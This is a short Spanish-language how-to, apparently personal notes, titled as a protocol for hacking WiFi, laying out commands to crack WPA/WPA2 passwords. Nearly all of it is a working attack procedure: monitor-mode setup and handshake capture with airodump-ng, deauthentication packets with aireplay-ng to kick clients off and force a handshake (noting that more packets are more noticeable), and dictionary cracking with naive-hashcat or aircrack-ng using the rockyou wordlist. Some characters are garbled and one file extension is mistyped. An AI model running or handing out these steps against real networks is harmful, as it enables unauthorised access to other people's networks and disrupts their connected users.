Protocolo para Hackear Wifi


Para Wifi Encriptado con WPA o WPA2

Primera Parte

sudo airmon-ng: Buscar el nombre del monitor, Se encuentra en la columna "Interface".

airmon-ng start wlan0: Empezar a monitorear la red.

iwconfig: Habilitar la interfaz en modo monitor.

airmon-ng check kill: Finaliza los procesos que muestren un mensaje de error.

airodump-ng *Nombre de la interfaz(mon0)*: Buscar los routers cercanos

Anotar la direccion MAC y el numero de canal del router

airodump-ng -c CANAL --bssid MAC -w /root/Desktop/ mon0: Monitorear la red seleccionada para ver si se produce un handshake

Salir de "airodump-ng" y luego abrir el escritorio.

mv ./-01.cap nombre.cap:Cambiar de nombre al .cap para trabajar mas facil.

cap2hccapx.bin nombre.cap nombre.hccapx: Convertir el archivo ".cap" al formato ".hccapx".

Instalar "Naive.Hashcat"

Descripcion: Servicio para desifrar la contrase単a

sudo git clone https://github.com/brannondorsey/naive-hashcat: Descarga el repositorio.

cd naive-hashcat:Ingresa al Repositorio.

curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

HASH_FILE=nombre.hccaps POT_FILE=nombre.pot HASH_TYPE=2500 ./naive-hashcat.sh: Ejecutar "naive-hashcat"

Esperar a que se termine de desifrar la contrase単a de la red: En el archivo nombre.pot la palabra que esta despues de ; sera la contrase単a.

Segunda Parte

Usar aircrack-ng en una pc sin tarjeta grafica

curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt: Descargar un archivo de diccionario(No se desifra si no esta en la lista de palabras).

aircrack-ng -a2 -b MAC -w rockyou.txt nombre.cap: Aircrack desifra la contrase単a, WPA=-a WPA2=-a2.

Ataques de desauntetificacion para forzar un Handshake

airodump-ng -c CANAL --bssid MAC: Monitorear la red para encontrar los dispositivos conectados.

aireplay-ng -0 2 -a MAC1 -c MAC2 mon0: Enviar paquetes de desaunteticacion.

LEER:

2: Numero de paquetes a enviar. si lo aumento es mas perceptible.

MAC1: MAC de la izquierda en el monitoreo.

MAC2: MAC de la derecha en el monitoreo.

mon0: Nombre de la interfaz.
